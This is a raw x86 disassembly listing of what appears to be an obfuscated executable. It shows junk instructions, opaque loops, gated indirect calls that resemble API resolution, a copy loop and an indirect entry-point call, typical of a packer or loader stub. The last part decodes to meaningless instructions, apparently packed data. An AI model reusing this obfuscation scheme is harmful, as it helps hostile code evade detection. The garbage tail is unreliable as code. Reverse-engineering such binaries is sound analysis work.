  420e35:	mov    DWORD PTR ds:0x428e87,0x15
  420e3f:	cmp    DWORD PTR ds:0x428e87,0x0
  420e46:	je     0x420e96
  420e4c:	cmp    DWORD PTR ds:0x428e87,0x6
  420e53:	jb     0x420e96
  420e59:	jmp    0x420e6a
  420e5e:	push   DWORD PTR [ebp-0x14]
  420e61:	push   DWORD PTR [ebp-0x1c]
  420e64:	call   DWORD PTR ds:0x42aa13
  420e6a:	cmp    DWORD PTR ds:0x428e87,0x7
  420e71:	jne    0x420e84
  420e77:	mov    ecx,DWORD PTR ds:0x428e87
  420e7d:	dec    ecx
  420e7e:	mov    DWORD PTR ds:0x428e87,ecx
  420e84:	mov    ecx,DWORD PTR ds:0x428e87
  420e8a:	dec    ecx
  420e8b:	mov    DWORD PTR ds:0x428e87,ecx
  420e91:	jmp    0x420e3f
  420e96:	mov    ds:0x428453,eax
  420e9b:	mov    eax,ds:0x4281f7
  420ea0:	mov    ecx,DWORD PTR ds:0x428e9b
  420ea6:	adc    ecx,DWORD PTR ds:0x428ec3
  420eac:	mov    DWORD PTR ds:0x428e9b,ecx
  420eb2:	mov    ecx,DWORD PTR [esp+0x30]
  420eb6:	sub    eax,ebx
  420eb8:	xor    eax,esi
  420eba:	mov    DWORD PTR ds:0x428ecb,0x2418
  420ec4:	mov    DWORD PTR [ecx],eax
  420ec6:	mov    DWORD PTR ds:0x428e97,0x6c0e
  420ed0:	lea    eax,[esp+0x2c]
  420ed4:	mov    DWORD PTR [esp+0x44],eax
  420ed8:	mov    DWORD PTR ds:0x428ea3,0x17d
  420ee2:	lea    eax,[ebp+0x4]
  420ee5:	mov    DWORD PTR [esp+0x2c],eax
  420ee9:	mov    DWORD PTR ds:0x428ec3,0x4441
  420ef3:	mov    al,ds:0x428588
  420ef8:	cmp    al,BYTE PTR ds:0x428599
  420efe:	mov    DWORD PTR ds:0x428e47,0x46bb
  420f08:	jne    0x420849
  420f0e:	mov    al,ds:0x4285a5
  420f13:	cmp    al,BYTE PTR ds:0x4285b6
  420f19:	mov    DWORD PTR ds:0x428eaf,0x61de
  420f23:	jne    0x420849
  420f29:	mov    DWORD PTR ds:0x428ea7,0xc38
  420f33:	push   0x4285bf
  420f38:	sbb    DWORD PTR ds:0x428e8b,0x428e7f
  420f42:	push   0x4285cb
  420f47:	call   edi
  420f49:	test   eax,eax
  420f4b:	mov    DWORD PTR ds:0x428e4b,0x74a1
  420f55:	je     0x420849
  420f5b:	mov    al,ds:0x4285d8
  420f60:	mov    DWORD PTR ds:0x428e27,0x62c3
  420f6a:	cmp    al,BYTE PTR ds:0x4285e9
  420f70:	jne    0x420849
  420f76:	mov    DWORD PTR ds:0x428e5b,0x5f7d
  420f80:	mov    al,ds:0x4285f5
  420f85:	mov    DWORD PTR ds:0x428e3b,0x1797
  420f8f:	cmp    al,BYTE PTR ds:0x428606
  420f95:	jne    0x420849
  420f9b:	push   0x42860f
  420fa0:	add    DWORD PTR ds:0x428ebf,0x428eab
  420faa:	push   0x42861b
  420faf:	call   edi
  420fb1:	test   eax,eax
  420fb3:	je     0x420849
  420fb9:	mov    DWORD PTR ds:0x428e67,0x333a
  420fc3:	mov    al,ds:0x428628
  420fc8:	cmp    al,BYTE PTR ds:0x428639
  420fce:	jne    0x420849
  420fd4:	mov    DWORD PTR ds:0x428e63,0x2ea7
  420fde:	mov    al,ds:0x428645
  420fe3:	mov    DWORD PTR ds:0x428e83,0x19a
  420fed:	cmp    al,BYTE PTR ds:0x428656
  420ff3:	mov    DWORD PTR ds:0x428ec3,0xb46
  420ffd:	jne    0x420849
  421003:	xor    DWORD PTR ds:0x428e4b,0x428e9b
  42100d:	push   0x42865f
  421012:	xor    DWORD PTR ds:0x428ea7,0x428ebf
  42101c:	push   0x42866b
  421021:	adc    DWORD PTR ds:0x428e7b,0x428e97
  42102b:	call   edi
  42102d:	test   eax,eax
  42102f:	je     0x420849
  421035:	mov    DWORD PTR ds:0x428eab,0x160c
  42103f:	mov    al,ds:0x428678
  421044:	cmp    al,BYTE PTR ds:0x428689
  42104a:	mov    DWORD PTR ds:0x428e33,0x7fda
  421054:	jne    0x420849
  42105a:	mov    DWORD PTR ds:0x428eb3,0x205
  421064:	mov    al,ds:0x428695
  421069:	mov    DWORD PTR ds:0x428ea7,0x1bc1
  421073:	cmp    al,BYTE PTR ds:0x4286a6
  421079:	mov    DWORD PTR ds:0x428e2f,0xcbc
  421083:	jne    0x420849
  421089:	push   0x4286af
  42108e:	xor    DWORD PTR ds:0x428e73,0x428e53
  421098:	push   0x4286bb
  42109d:	call   edi
  42109f:	test   eax,eax
  4210a1:	mov    DWORD PTR ds:0x428e7f,0x3ee2
  4210ab:	je     0x420849
  4210b1:	mov    DWORD PTR ds:0x428e73,0x4aa5
  4210bb:	mov    al,ds:0x4286c8
  4210c0:	mov    DWORD PTR ds:0x428e73,0x2576
  4210ca:	cmp    al,BYTE PTR ds:0x4286d9
  4210d0:	jne    0x420849
  4210d6:	mov    al,ds:0x4286e5
  4210db:	mov    DWORD PTR ds:0x428eab,0x2fd2
  4210e5:	cmp    al,BYTE PTR ds:0x4286f6
  4210eb:	mov    DWORD PTR ds:0x428e77,0x665f
  4210f5:	jne    0x420849
  4210fb:	push   0x4286ff
  421100:	xor    DWORD PTR ds:0x428eab,0x43e0
  42110a:	push   0x42870b
  42110f:	call   edi
  421111:	add    DWORD PTR ds:0x428eaf,0x428e77
  42111b:	test   eax,eax
  42111d:	mov    DWORD PTR ds:0x428e7f,0x618e
  421127:	je     0x420849
  42112d:	mov    al,ds:0x428718
  421132:	mov    DWORD PTR ds:0x428ebb,0x5321
  42113c:	cmp    al,BYTE PTR ds:0x428729
  421142:	jne    0x420849
  421148:	mov    al,ds:0x428735
  42114d:	cmp    al,BYTE PTR ds:0x428746
  421153:	jne    0x420849
  421159:	adc    DWORD PTR ds:0x428ea7,0x4891
  421163:	push   0x42874f
  421168:	xor    DWORD PTR ds:0x428ecb,0x428ec3
  421172:	push   0x42875b
  421177:	call   edi
  421179:	xor    DWORD PTR ds:0x428ecb,0x428e67
  421183:	test   eax,eax
  421185:	mov    DWORD PTR ds:0x428e77,0x34d8
  42118f:	je     0x420849
  421195:	mov    DWORD PTR ds:0x428e63,0x47d8
  42119f:	mov    al,ds:0x428768
  4211a4:	mov    DWORD PTR ds:0x428ebb,0x60f8
  4211ae:	cmp    al,BYTE PTR ds:0x428779
  4211b4:	mov    DWORD PTR ds:0x428e63,0x352f
  4211be:	jne    0x420849
  4211c4:	mov    al,ds:0x428785
  4211c9:	mov    DWORD PTR ds:0x428e37,0x65de
  4211d3:	cmp    al,BYTE PTR ds:0x428796
  4211d9:	mov    DWORD PTR ds:0x428e3f,0x2ba7
  4211e3:	jne    0x420849
  4211e9:	push   0x42879f
  4211ee:	sbb    DWORD PTR ds:0x428e6b,0x25d3
  4211f8:	push   0x4287ab
  4211fd:	call   edi
  4211ff:	adc    DWORD PTR ds:0x428ebf,0x428ea3
  421209:	test   eax,eax
  42120b:	mov    DWORD PTR ds:0x428e6f,0x1c88
  421215:	je     0x420849
  42121b:	not    DWORD PTR ds:0x428e63
  421221:	mov    al,ds:0x4287b8
  421226:	cmp    al,BYTE PTR ds:0x4287c9
  42122c:	jne    0x420849
  421232:	mov    al,ds:0x4287d5
  421237:	mov    DWORD PTR ds:0x428e7b,0x5e30
  421241:	cmp    al,BYTE PTR ds:0x4287e6
  421247:	mov    DWORD PTR ds:0x428e9b,0x700f
  421251:	jne    0x420849
  421257:	or     DWORD PTR ds:0x428e83,0x99a
  421261:	push   0x4287ef
  421266:	adc    DWORD PTR ds:0x428e9f,0x22ee
  421270:	push   0x4287fb
  421275:	adc    DWORD PTR ds:0x428ecb,0x428ec3
  42127f:	call   edi
  421281:	sub    DWORD PTR ds:0x428e43,0x72f1
  42128b:	test   eax,eax
  42128d:	je     0x420849
  421293:	mov    DWORD PTR ds:0x428e57,0x70e
  42129d:	mov    al,ds:0x428808
  4212a2:	cmp    al,BYTE PTR ds:0x428819
  4212a8:	jne    0x420849
  4212ae:	mov    al,ds:0x428825
  4212b3:	mov    DWORD PTR ds:0x428ea3,0x4a62
  4212bd:	cmp    al,BYTE PTR ds:0x428836
  4212c3:	mov    DWORD PTR ds:0x428ea7,0x4507
  4212cd:	jne    0x420849
  4212d3:	sbb    DWORD PTR ds:0x428e23,0x428e6f
  4212dd:	push   0x42883f
  4212e2:	xor    DWORD PTR ds:0x428e2b,0x428e87
  4212ec:	push   0x42884b
  4212f1:	or     DWORD PTR ds:0x428e8f,0x428e6b
  4212fb:	call   edi
  4212fd:	test   eax,eax
  4212ff:	mov    DWORD PTR ds:0x428ec7,0x3c0e
  421309:	je     0x420849
  42130f:	mov    DWORD PTR ds:0x428e2f,0x1c83
  421319:	mov    al,ds:0x428858
  42131e:	cmp    al,BYTE PTR ds:0x428869
  421324:	jne    0x420849
  42132a:	mov    al,ds:0x428875
  42132f:	mov    DWORD PTR ds:0x428eab,0x7836
  421339:	cmp    al,BYTE PTR ds:0x428886
  42133f:	mov    DWORD PTR ds:0x428e33,0x5d16
  421349:	jne    0x420849
  42134f:	push   0x42888f
  421354:	or     DWORD PTR ds:0x428e6f,0x428e43
  42135e:	push   0x42889b
  421363:	adc    DWORD PTR ds:0x428e6f,0x64ad
  42136d:	call   edi
  42136f:	and    DWORD PTR ds:0x428e93,0x428eb3
  421379:	test   eax,eax
  42137b:	je     0x420849
  421381:	mov    al,ds:0x4288a8
  421386:	cmp    al,BYTE PTR ds:0x4288b9
  42138c:	mov    DWORD PTR ds:0x428e2b,0x5e8c
  421396:	jne    0x420849
  42139c:	mov    DWORD PTR ds:0x428ea3,0x4898
  4213a6:	mov    al,ds:0x4288c5
  4213ab:	cmp    al,BYTE PTR ds:0x4288d6
  4213b1:	jne    0x420849
  4213b7:	push   0x4288df
  4213bc:	push   0x4288eb
  4213c1:	call   edi
  4213c3:	test   eax,eax
  4213c5:	mov    DWORD PTR ds:0x428ebb,0xe84
  4213cf:	je     0x420849
  4213d5:	mov    al,ds:0x4288f8
  4213da:	cmp    al,BYTE PTR ds:0x428909
  4213e0:	mov    DWORD PTR ds:0x428e3b,0x418e
  4213ea:	jne    0x420849
  4213f0:	mov    DWORD PTR ds:0x428e5b,0x25d1
  4213fa:	mov    al,ds:0x428915
  4213ff:	cmp    al,BYTE PTR ds:0x428926
  421405:	mov    DWORD PTR ds:0x428e6b,0x4b5f
  42140f:	jne    0x420849
  421415:	push   0x42892f
  42141a:	adc    DWORD PTR ds:0x428ec7,0x4db7
  421424:	push   0x42893b
  421429:	sbb    DWORD PTR ds:0x428e6b,0x428ebf
  421433:	call   edi
  421435:	sub    DWORD PTR ds:0x428e33,0x428e97
  42143f:	test   eax,eax
  421441:	mov    DWORD PTR ds:0x428ec7,0x19ef
  42144b:	je     0x420849
  421451:	mov    al,ds:0x428948
  421456:	cmp    al,BYTE PTR ds:0x428959
  42145c:	jne    0x420849
  421462:	mov    al,ds:0x428965
  421467:	cmp    al,BYTE PTR ds:0x428976
  42146d:	jne    0x420849
  421473:	push   0x42897f
  421478:	push   0x42898b
  42147d:	call   edi
  42147f:	test   eax,eax
  421481:	je     0x420849
  421487:	mov    al,ds:0x428998
  42148c:	cmp    al,BYTE PTR ds:0x4289a9
  421492:	jne    0x420849
  421498:	mov    al,ds:0x4289b5
  42149d:	cmp    al,BYTE PTR ds:0x4289c6
  4214a3:	jne    0x420849
  4214a9:	push   0x4289cf
  4214ae:	push   0x4289db
  4214b3:	call   edi
  4214b5:	test   eax,eax
  4214b7:	je     0x420849
  4214bd:	mov    al,ds:0x4289e8
  4214c2:	cmp    al,BYTE PTR ds:0x4289f9
  4214c8:	jne    0x420849
  4214ce:	mov    al,ds:0x428a05
  4214d3:	cmp    al,BYTE PTR ds:0x428a16
  4214d9:	jne    0x420849
  4214df:	push   0x428a1f
  4214e4:	push   0x428a2b
  4214e9:	call   edi
  4214eb:	test   eax,eax
  4214ed:	je     0x420849
  4214f3:	mov    al,ds:0x428a38
  4214f8:	cmp    al,BYTE PTR ds:0x428a49
  4214fe:	jne    0x420849
  421504:	mov    al,ds:0x428a55
  421509:	cmp    al,BYTE PTR ds:0x428a66
  42150f:	jne    0x420849
  421515:	push   0x428a6f
  42151a:	push   0x428a7b
  42151f:	call   edi
  421521:	test   eax,eax
  421523:	je     0x420849
  421529:	mov    al,ds:0x428a88
  42152e:	cmp    al,BYTE PTR ds:0x428a99
  421534:	jne    0x420849
  42153a:	mov    al,ds:0x428aa5
  42153f:	cmp    al,BYTE PTR ds:0x428ab6
  421545:	jne    0x420849
  42154b:	push   0x428abf
  421550:	push   0x428acb
  421555:	call   edi
  421557:	test   eax,eax
  421559:	je     0x420849
  42155f:	mov    al,ds:0x428ad8
  421564:	cmp    al,BYTE PTR ds:0x428ae9
  42156a:	jne    0x420849
  421570:	mov    al,ds:0x428af5
  421575:	cmp    al,BYTE PTR ds:0x428b06
  42157b:	jne    0x420849
  421581:	push   0x428b0f
  421586:	push   0x428b1b
  42158b:	call   edi
  42158d:	test   eax,eax
  42158f:	je     0x420849
  421595:	mov    al,ds:0x428b28
  42159a:	cmp    al,BYTE PTR ds:0x428b39
  4215a0:	jne    0x420849
  4215a6:	mov    al,ds:0x428b45
  4215ab:	cmp    al,BYTE PTR ds:0x428b56
  4215b1:	jne    0x420849
  4215b7:	push   0x428b5f
  4215bc:	push   0x428b6b
  4215c1:	call   edi
  4215c3:	test   eax,eax
  4215c5:	je     0x420849
  4215cb:	mov    al,ds:0x428b78
  4215d0:	cmp    al,BYTE PTR ds:0x428b89
  4215d6:	jne    0x420849
  4215dc:	mov    al,ds:0x428b95
  4215e1:	cmp    al,BYTE PTR ds:0x428ba6
  4215e7:	jne    0x420849
  4215ed:	push   0x428baf
  4215f2:	push   0x428bbb
  4215f7:	call   edi
  4215f9:	test   eax,eax
  4215fb:	je     0x420849
  421601:	mov    al,ds:0x428bc8
  421606:	cmp    al,BYTE PTR ds:0x428bd9
  42160c:	jne    0x420849
  421612:	mov    al,ds:0x428be5
  421617:	cmp    al,BYTE PTR ds:0x428bf6
  42161d:	jne    0x420849
  421623:	push   0x428bff
  421628:	push   0x428c0b
  42162d:	call   edi
  42162f:	test   eax,eax
  421631:	je     0x420849
  421637:	mov    eax,DWORD PTR [esp+0x3c]
  42163b:	cmp    eax,0xf89c85a4
  421640:	je     0x42169f
  421646:	mov    eax,DWORD PTR [esp+0x20]
  42164a:	mov    ecx,DWORD PTR [esp+0x38]
  42164e:	xor    eax,esi
  421650:	add    eax,ebx
  421652:	cmp    eax,ecx
  421654:	je     0x42169f
  42165a:	mov    eax,ds:0x428373
  42165f:	mov    eax,DWORD PTR [eax+0x194]
  421665:	mov    ecx,DWORD PTR [eax]
  421667:	mov    eax,DWORD PTR [ecx+0x3c]
  42166a:	push   DWORD PTR ds:0x428453
  421670:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  421674:	push   DWORD PTR ds:0x4281f7
  42167a:	add    eax,ecx
  42167c:	mov    ecx,DWORD PTR ds:0x428373
  421682:	mov    ecx,DWORD PTR [ecx+0x194]
  421688:	push   DWORD PTR [ecx]
  42168a:	call   eax
  42168c:	mov    ecx,DWORD PTR ds:0x428373
  421692:	mov    ecx,DWORD PTR [ecx+0x1cc]
  421698:	mov    DWORD PTR [ecx],eax
  42169a:	jmp    0x421870
  42169f:	mov    eax,DWORD PTR [esp+0x20]
  4216a3:	mov    ecx,DWORD PTR [esp+0x40]
  4216a7:	xor    eax,esi
  4216a9:	add    eax,ebx
  4216ab:	cmp    eax,ecx
  4216ad:	jne    0x421718
  4216b3:	mov    eax,DWORD PTR [esp+0x20]
  4216b7:	mov    ecx,DWORD PTR ds:0x428373
  4216bd:	mov    ecx,DWORD PTR [ecx+0x198]
  4216c3:	xor    eax,esi
  4216c5:	add    eax,ebx
  4216c7:	cmp    eax,DWORD PTR [ecx]
  4216c9:	jne    0x4216f1
  4216cf:	mov    eax,DWORD PTR [esp+0x20]
  4216d3:	push   0xffffffff
  4216d5:	push   0x70941f91
  4216da:	xor    eax,esi
  4216dc:	add    eax,ebx
  4216de:	push   eax
  4216df:	push   0xf89c85a1
  4216e4:	push   DWORD PTR [esp+0x1c]
  4216e8:	push   DWORD PTR [esp+0x34]
  4216ec:	call   0x41b999
  4216f1:	push   DWORD PTR [esp+0xc]
  4216f5:	push   DWORD PTR [esp+0x24]
  4216f9:	call   0x401000
  4216fe:	mov    eax,DWORD PTR [esp+0x20]
  421702:	xor    eax,esi
  421704:	add    eax,ebx
  421706:	mov    ds:0x4283ff,eax
  42170b:	mov    eax,DWORD PTR [esp+0x20]
  42170f:	xor    eax,esi
  421711:	add    eax,ebx
  421713:	mov    ds:0x4283f7,eax
  421718:	mov    eax,DWORD PTR [esp+0x2c]
  42171c:	test   eax,eax
  42171e:	je     0x421870
  421724:	mov    DWORD PTR [esp+0x4c],0xf152c3c
  42172c:	mov    DWORD PTR [esp+0x54],0x712ed2f
  421734:	mov    DWORD PTR [esp+0x48],0x373fc0d
  42173c:	mov    DWORD PTR [esp+0x50],0x72670add
  421744:	call   0x41932f
  421749:	mov    eax,DWORD PTR [esp+0x34]
  42174d:	mov    eax,DWORD PTR [esp+0xc]
  421751:	mov    DWORD PTR [esp+0x30],eax
  421755:	mov    eax,DWORD PTR [esp+0x20]
  421759:	mov    DWORD PTR [esp+0xc],eax
  42175d:	mov    eax,eax
  42175f:	mov    eax,ds:0x428373
  421764:	mov    ecx,DWORD PTR [eax+0x1c0]
  42176a:	mov    edx,DWORD PTR [ecx]
  42176c:	and    DWORD PTR [esp+0x14],0x0
  421771:	mov    edi,0xfabdbed2
  421776:	add    edx,edi
  421778:	adc    DWORD PTR [esp+0x14],0xffffffff
  42177d:	mov    ecx,0x8a29a143
  421782:	xor    edx,ecx
  421784:	mov    DWORD PTR [esp+0x18],edx
  421788:	mov    edx,DWORD PTR [esp+0x14]
  42178c:	xor    edx,0x0
  42178f:	cmp    DWORD PTR [esp+0x18],0x70941f90
  421797:	mov    DWORD PTR [esp+0x1c],edx
  42179b:	jne    0x4217aa
  4217a1:	cmp    edx,0xffffffff
  4217a4:	je     0x421813
  4217aa:	mov    eax,DWORD PTR [eax+0x1c8]
  4217b0:	mov    eax,DWORD PTR [eax]
  4217b2:	cdq    
  4217b3:	add    eax,edi
  4217b5:	adc    edx,0xffffffff
  4217b8:	and    DWORD PTR [esp+0x14],0x0
  4217bd:	xor    edx,0x0
  4217c0:	mov    DWORD PTR [esp+0x24],edx
  4217c4:	mov    edx,DWORD PTR [esp+0xc]
  4217c8:	mov    DWORD PTR [esp+0x10],edx
  4217cc:	xor    eax,ecx
  4217ce:	add    DWORD PTR [esp+0x10],edi
  4217d2:	mov    edx,DWORD PTR [esp+0x10]
  4217d6:	adc    DWORD PTR [esp+0x14],0xffffffff
  4217db:	xor    edx,ecx
  4217dd:	mov    DWORD PTR [esp+0x18],edx
  4217e1:	mov    edx,DWORD PTR [esp+0x14]
  4217e5:	xor    edx,0x0
  4217e8:	mov    DWORD PTR [esp+0x1c],edx
  4217ec:	cmp    DWORD PTR [esp+0x18],eax
  4217f0:	jne    0x421802
  4217f6:	mov    eax,DWORD PTR [esp+0x24]
  4217fa:	cmp    edx,eax
  4217fc:	je     0x421813
  421802:	mov    eax,DWORD PTR [esp+0xc]
  421806:	add    eax,DWORD PTR [esp+0x30]
  42180a:	mov    DWORD PTR [esp+0xc],eax
  42180e:	jmp    0x421870
  421813:	mov    eax,ds:0x4283f7
  421818:	mov    edx,DWORD PTR ds:0x4283ff
  42181e:	xor    eax,edx
  421820:	mov    ds:0x4283f7,eax
  421825:	mov    edx,DWORD PTR ds:0x4283f7
  42182b:	mov    eax,DWORD PTR [esp+0x2c]
  42182f:	add    DWORD PTR [eax],edx
  421831:	mov    edx,DWORD PTR [esp+0xc]
  421835:	mov    eax,ds:0x4283f7
  42183a:	xor    edx,esi
  42183c:	add    edx,ebx
  42183e:	xor    ebx,ebx
  421840:	add    edx,edi
  421842:	adc    ebx,0xffffffff
  421845:	xor    esi,esi
  421847:	xor    edx,ecx
  421849:	xor    ebx,0x0
  42184c:	add    eax,edi
  42184e:	adc    esi,0xffffffff
  421851:	xor    eax,ecx
  421853:	xor    esi,0x0
  421856:	cmp    eax,edx
  421858:	jne    0x421870
  42185e:	cmp    esi,ebx
  421860:	jne    0x421870
  421866:	mov    eax,ds:0x4283f7
  42186b:	mov    ds:0x4283ff,eax
  421870:	mov    eax,ds:0x428373
  421875:	push   0x4
  421877:	add    eax,0x1cc
  42187c:	push   eax
  42187d:	lea    eax,[esp+0x3c]
  421881:	push   eax
  421882:	call   0x421896
  421887:	mov    eax,DWORD PTR [esp+0x34]
  42188b:	mov    eax,DWORD PTR [eax]
  42188d:	pop    edi
  42188e:	pop    esi
  42188f:	pop    ebx
  421890:	mov    esp,ebp
  421892:	pop    ebp
  421893:	ret    0xc
  421896:	push   ebp
  421897:	mov    ebp,esp
  421899:	sub    esp,0x10
  42189c:	mov    eax,0xf89c85a5
  4218a1:	mov    DWORD PTR [ebp-0x4],eax
  4218a4:	mov    DWORD PTR ds:0x428ecb,0x1d
  4218ae:	cmp    DWORD PTR ds:0x428ecb,0x0
  4218b5:	je     0x421906
  4218bb:	cmp    DWORD PTR ds:0x428ecb,0x8
  4218c2:	jg     0x421906
  4218c8:	jmp    0x4218d8
  4218cd:	push   0x428e77
  4218d2:	call   DWORD PTR ds:0x42aa17
  4218d8:	cmp    DWORD PTR ds:0x428ecb,0x9
  4218df:	jne    0x4218f2
  4218e5:	mov    edx,DWORD PTR ds:0x428ecb
  4218eb:	dec    edx
  4218ec:	mov    DWORD PTR ds:0x428ecb,edx
  4218f2:	xor    edx,edx
  4218f4:	add    edx,DWORD PTR ds:0x428ecb
  4218fa:	dec    edx
  4218fb:	mov    DWORD PTR ds:0x428ecb,edx
  421901:	jmp    0x4218ae
  421906:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  42190d:	xor    ecx,edx
  42190f:	mov    ecx,DWORD PTR [ebp-0x4]
  421912:	sbb    edx,0x5246
  421918:	push   esi
  421919:	or     DWORD PTR ds:0x428e5b,edi
  42191f:	mov    edx,0x75108af
  421924:	adc    DWORD PTR ds:0x428e43,0x2a82
  42192e:	xor    ecx,edx
  421930:	sbb    DWORD PTR ds:0x428e93,edi
  421936:	mov    esi,0x3272f6
  42193b:	push   edi
  42193c:	inc    DWORD PTR ds:0x428e47
  421942:	mov    edi,DWORD PTR [ebp+0x10]
  421945:	adc    DWORD PTR ds:0x428e43,0x428ecf
  42194f:	add    ecx,esi
  421951:	cmp    ecx,edi
  421953:	mov    DWORD PTR ds:0x428ea3,0x27d
  42195d:	je     0x421a9e
  421963:	mov    ecx,DWORD PTR ds:0x428e33
  421969:	or     DWORD PTR ds:0x428e2b,ecx
  42196f:	mov    ecx,DWORD PTR [ebp-0x4]
  421972:	mov    edi,DWORD PTR [ebp+0x10]
  421975:	xor    eax,eax
  421977:	xor    ecx,edx
  421979:	sub    DWORD PTR ds:0x428e2b,0x428e2f
  421983:	add    ecx,esi
  421985:	xor    DWORD PTR ds:0x428e6b,0x2e89
  42198f:	add    edi,0xfabdbed2
  421995:	mov    DWORD PTR ds:0x428e27,0xdb6
  42199f:	adc    eax,0xffffffff
  4219a2:	adc    DWORD PTR ds:0x428e23,0x428e77
  4219ac:	xor    eax,0x0
  4219af:	mov    DWORD PTR [ebp-0xc],eax
  4219b2:	push   ebx
  4219b3:	mov    eax,ds:0x428e37
  4219b8:	add    eax,DWORD PTR ds:0x428ebf
  4219be:	mov    ds:0x428e37,eax
  4219c3:	xor    ebx,ebx
  4219c5:	adc    DWORD PTR ds:0x428e4b,0x1a92
  4219cf:	xor    edi,0x8a29a143
  4219d5:	adc    eax,DWORD PTR ds:0x428e3b
  4219db:	mov    eax,ecx
  4219dd:	xor    DWORD PTR ds:0x428e4b,0x428e93
  4219e7:	add    eax,0xfabdbed2
  4219ec:	mov    DWORD PTR ds:0x428e2b,0x4aa
  4219f6:	adc    ebx,0xffffffff
  4219f9:	xor    eax,0x8a29a143
  4219fe:	and    DWORD PTR ds:0x428e9f,0x428e57
  421a08:	xor    ebx,0x0
  421a0b:	mov    DWORD PTR ds:0x428e3b,0x3b6d
  421a15:	cmp    eax,edi
  421a17:	jne    0x421a30
  421a1d:	cmp    ebx,DWORD PTR [ebp-0xc]
  421a20:	je     0x421a98
  421a26:	jmp    0x421a30
  421a2b:	mov    esi,0x3272f6
  421a30:	mov    eax,DWORD PTR [ebp-0x4]
  421a33:	mov    edi,DWORD PTR [ebp-0x8]
  421a36:	xor    edi,edx
  421a38:	add    edi,esi
  421a3a:	mov    esi,DWORD PTR [ebp+0x8]
  421a3d:	imul   edi,ecx
  421a40:	mov    ebx,DWORD PTR [ebp+0xc]
  421a43:	xor    eax,edx
  421a45:	add    eax,ecx
  421a47:	mov    al,BYTE PTR [ebx+eax*1+0x3272f6]
  421a4e:	mov    BYTE PTR [edi+esi*1],al
  421a51:	mov    eax,DWORD PTR [ebp-0x8]
  421a54:	mov    esi,DWORD PTR [ebp+0x10]
  421a57:	xor    eax,edx
  421a59:	xor    ebx,ebx
  421a5b:	add    esi,0xfabdbed2
  421a61:	adc    ebx,0xffffffff
  421a64:	lea    ecx,[ecx+eax*1+0x3272f6]
  421a6b:	xor    edi,edi
  421a6d:	xor    esi,0x8a29a143
  421a73:	xor    ebx,0x0
  421a76:	mov    eax,ecx
  421a78:	add    eax,0xfabdbed2
  421a7d:	adc    edi,0xffffffff
  421a80:	xor    eax,0x8a29a143
  421a85:	xor    edi,0x0
  421a88:	cmp    eax,esi
  421a8a:	jne    0x421a2b
  421a90:	cmp    edi,ebx
  421a92:	jne    0x421a2b
  421a98:	mov    eax,0xf89c85a4
  421a9d:	pop    ebx
  421a9e:	pop    edi
  421a9f:	pop    esi
  421aa0:	leave  
  421aa1:	ret    0xc
  421aa4:	push   ebp
  421aa5:	mov    ebp,esp
  421aa7:	push   ecx
  421aa8:	dec    eax
  421aa9:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  421ab0:	mov    ecx,DWORD PTR ds:0x428ea7
  421ab6:	sub    DWORD PTR ds:0x428e93,ecx
  421abc:	jmp    0x423e02
  421ac1:	loope  0x421acb
  421ac3:	jg     0x421b24
  421ac5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ac6:	add    al,0xe1
  421ac8:	test   BYTE PTR [ecx+0xdbd524a],al
  421ace:	loopne 0x421aa9
  421ad0:	sbb    eax,0x8382b66f
  421ad5:	pop    edx
  421ad6:	pusha  
  421ad7:	add    DWORD PTR [ebx-0x2bfa49df],0xffffffec
  421ade:	jecxz  0x421a87
  421ae0:	cs retf 0x7cfc
  421ae4:	mov    WORD PTR [ebp+0x3e],ss
  421ae7:	into   
  421ae8:	lock test eax,0xdb7bda65
  421aee:	mov    ebx,0xa898ecc0
  421af3:	pop    ecx
  421af4:	in     eax,0xaf
  421af6:	mov    edi,0xd3dfeca5
  421afb:	sbb    ebp,DWORD PTR [eax-0x13cf55eb]
  421b01:	les    ecx,FWORD PTR [edx+0x40]
  421b04:	sbb    DWORD PTR [ebp-0x1b],edi
  421b07:	sahf   
  421b08:	push   edi
  421b09:	xor    dl,dh
  421b0b:	xor    esp,edi
  421b0d:	and    bh,BYTE PTR [edx]
  421b0f:	inc    esi
  421b10:	pop    esi
  421b11:	dec    esi
  421b12:	pop    esi
  421b13:	and    ecx,0xa13912c1
  421b19:	test   eax,0xfd54d605
  421b1e:	push   ebp
  421b1f:	std    
  421b20:	and    cl,BYTE PTR [edi-0x5d]
  421b23:	addr16 pop ss
  421b25:	outs   dx,BYTE PTR ds:[esi]
  421b26:	pop    esi
  421b27:	and    BYTE PTR [esp+edi*4-0x7dd88eb3],bh
  421b2e:	imul   edx,DWORD PTR [edi-0x597c14dd],0xcd9e1d18
  421b38:	jg     0x421b36
  421b3a:	lahf   
  421b3b:	jo     0x421b64
  421b3d:	cmp    eax,0xaa327e6b
  421b42:	pushf  
  421b43:	mov    bl,al
  421b45:	arpl   si,sp
  421b47:	cmp    DWORD PTR [edi-0x23de3b5d],esi
  421b4d:	pop    esp
  421b4e:	or     BYTE PTR [edx+0x8],ch
  421b51:	call   0x1d5f:0x4d4c1191
  421b58:	repnz dec esp
  421b5a:	jl     0x421b13
  421b5c:	or     al,0xbf
  421b5e:	js     0x421ae9
  421b60:	mov    bl,0x61
  421b62:	jb     0x421b9d
  421b64:	cmp    eax,DWORD PTR [edx]
  421b66:	mov    bl,BYTE PTR [ebp+0x59]
  421b69:	push   edi
  421b6a:	jle    0x421b80
  421b6c:	pusha  
  421b6d:	mov    bh,cl
  421b6f:	les    eax,FWORD PTR [ecx-0x1e]
  421b72:	dec    edx
  421b73:	in     eax,dx
  421b74:	or     edi,DWORD PTR [ebp+esi*1-0x76]
  421b78:	xchg   BYTE PTR [ebx+0x64],dh
  421b7b:	or     al,0x34
  421b7d:	outs   dx,BYTE PTR ds:[esi]
  421b7e:	xor    al,0x5a
  421b80:	sub    BYTE PTR [esi+0x2847ce40],dh
  421b86:	push   cs
  421b87:	dec    ebx
  421b88:	pop    esi
  421b89:	dec    esi
  421b8a:	or     eax,0x497f4af0
  421b8f:	cdq    
  421b90:	les    esp,FWORD PTR [edi+0x46]
  421b93:	and    al,0x95
  421b95:	sbb    eax,0xcdca4ee
  421b9a:	push   edx
  421b9b:	or     al,0xfe
  421b9d:	pop    edx
  421b9e:	shl    ebp,1
  421ba0:	add    BYTE PTR [ecx+0x2b],dl
  421ba3:	scas   eax,DWORD PTR es:[edi]
  421ba4:	in     al,0x33
  421ba6:	gs ds mov ch,0xf9
